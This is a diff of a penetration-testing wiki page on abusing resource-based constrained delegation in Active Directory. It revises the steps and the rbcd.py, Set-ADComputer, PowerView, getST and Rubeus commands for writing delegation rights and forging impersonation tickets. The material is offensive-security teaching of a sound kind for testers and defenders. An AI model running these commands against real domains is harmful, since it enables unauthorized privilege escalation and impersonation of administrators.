@@ -138,39 +138,29 @@ Once the ticket is injected, it can natively be used when accessing the service 
 
 If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor of another object \(e.g. the `GenericWrite` ACE, see [Abusing ACLs](../access-control-entries/)\), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.
 
-Then, in order to abuse this, the attacker has to control the computer account the object's attribute has been populated with.
+For this attack to work, the attacker needs to populate the target attribute with an account having a `ServicePrincipalName` set \(needed for Kerberos delegation operations\). The usual way to conduct these attacks is to create a computer account, which comes with an SPN set. This is usually possible thanks to a domain-level attribute called [`MachineAccountQuota`](../domain-settings/machineaccountquota.md) that allows regular users to create up to 10 computer accounts. While this "computer account creation + RBCD attack" is the most common exploitation path, doing so with a user account \(having at least one SPN\) is perfectly feasible.
 
-In this situation, an attacker can obtain admin access to the target resource \(the object configured for RBCD in the first step\).
-
-1. Control a computer account \(e.g. create a computer account by leveraging the `MachineAccountQuota` setting\)
-2. Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor of another object with the controlled machine account as value, using the credentials of a domain user that has the capability to populate attributes on the target object \(e.g. `GenericWrite`\).
-3. Using the computer account credentials, operate S4U2Self and S4U2Proxy requests, just like constrained delegation with protocol transition.
+Then, in order to abuse this, the attacker has to control the account the object's attribute has been populated with \(i.e. the account that has an SPN\). Using that account's credentials, the attacker can obtain a ticket through S4U2Self and S4U2Proxy requests, just like constrained delegation with protocol transition.
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-**1 - Check the value** 🔎 **& Create the computer account** ⚒\*\*\*\*
+**1 - Edit the target's security descriptor** ✏ ****
 
-Check the [MachineAccountQuota](../domain-settings/machineaccountquota.md) page
-
-**2 - Edit the target's security descriptor** ✏ ****
-
-The [rbcd-attack](https://github.com/tothi/rbcd-attack) script \(Python\) can be used to modify the delegation rights \(populate the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor\), using the credentials of a domain user. The [rbcd permissions](https://github.com/NinjaStyle82/rbcd_permissions) script \(Python\) is an alternative to rbcd-attack that can also do [pass-the-hash](../ntlm/pass-the-hash.md), [pass-the-ticket](pass-the-ticket.md), and operate cleanup of the security descriptor.
+The [rbcd.py](https://github.com/ShutdownRepo/impacket/blob/rbcd/examples/rbcd.py) script \(Python\) \(still in a Pull Request process at the time of writing - 29th Sept. 2021\) can be used to read, write or clear the delegation rights, using the credentials of a domain user that has the needed permissions.
 
 ```bash
-rbcd-attack -f 'SHUTDOWN' -t $Target -dc-ip $DomainController 'DOMAIN\anonymous:anonymous'
+# Read the security descriptor
+rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action read 'DOMAIN'/'POWERFULUSER':'PASSWORD'
 
-# Attack (example with user/password)
-rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=TARGET,OU=Computers,DC=DOMAIN,DC=LOCAL' -d $DOMAIN_FQDN -u $USER -p $PASSWORD -l $LDAPSERVER
-
-# Cleanup
-rbcd-permissions --cleanup -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=TARGET,OU=Computers,DC=DOMAIN,DC=LOCAL' -d $DOMAIN_FQDN -u $USER -p $PASSWORD -l $LDAPSERVER
+# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity SD
+rbcd.py -delegate-from 'accountwithSPN' -delegate-to 'target$' -dc-ip 'DomainController' -action write 'DOMAIN'/'POWERFULUSER':'PASSWORD'
 ```
 
 {% hint style="success" %}
-Testers can use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to set the delegation rights with the `--delegate-access` option \(see [NTLM relay](../ntlm/relay.md)\) instead of using [rbcd-attack](https://github.com/tothi/rbcd-attack) or [rbcd-permissions](https://github.com/NinjaStyle82/rbcd_permissions)
+Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to set the delegation rights with the `--delegate-access` option when conducting this attack from a [relayed authentication](../ntlm/relay.md).
 {% endhint %}
 
-**3 - Obtain a ticket** 🎫 ****
+**2 - Obtain a ticket** 🎫 ****
 
 Once the security descriptor has been modified, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can then perform all the necessary steps to obtain the final "impersonating" ST \(in this case, "Administrator" is impersonated but it can be any user in the environment\).
 
@@ -184,7 +174,7 @@ The SPN \(ServicePrincipalName\) set will have an impact on what services will b
 In [some cases](delegations.md#theory), the delegation will not work. Depending on the context, the [bronze bit ](forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability \(CVE-2020-17049\) can be used with the `-force-forwardable` option to try to bypass restrictions.
 {% endhint %}
 
-**4 - Pass-the-ticket** 🛂 ****
+**3 - Pass-the-ticket** 🛂 ****
 
 Once the ticket is obtained, it can be used with [pass-the-ticket](pass-the-ticket.md).
 {% endtab %}
@@ -192,20 +182,16 @@ Once the ticket is obtained, it can be used with [pass-the-ticket](pass-the-tick
 {% tab title="Windows" %}
 In order to run the following commands and tools as other users, testers can check the [user impersonation](../credentials/impersonation.md) part.
 
-**1 - Check the value** 🔎 **& Create the computer account** ⚒\*\*\*\*
-
-Check the [MachineAccountQuota](../domain-settings/machineaccountquota.md) page
-
-**2 - Edit the target's security descriptor** ✏ ****
+**1 - Edit the target's security descriptor** ✏ ****
 
 The [PowerShell ActiveDirectory module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps)'s cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object \(in this case, to modify the delegation rights\).
 
 ```bash
-# Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
-Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'PENTEST01$'
-
-# Read the attribute
+# Read the security descriptor
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
+
+# Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'accountwithSPN'
 ```
 
 PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute \([source](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html?highlight=genericall#id31)\).
@@ -223,7 +209,7 @@ $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
-**3 - Obtain a ticket** 🎫 ****
+**2 - Obtain a ticket** 🎫 ****
 
 [Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the "impersonation ST" and inject it for later use.
 
@@ -237,7 +223,7 @@ The NT hash can be computed as follows.
 Rubeus.exe hash /password:$password
 ```
 
-**4 - Pass-the-ticket** 🛂 ****
+**3 - Pass-the-ticket** 🛂 ****
 
 Once the ticket is injected, it can natively be used when accessing the service \(see [pass-the-ticket](pass-the-ticket.md)\).
 {% endtab %}
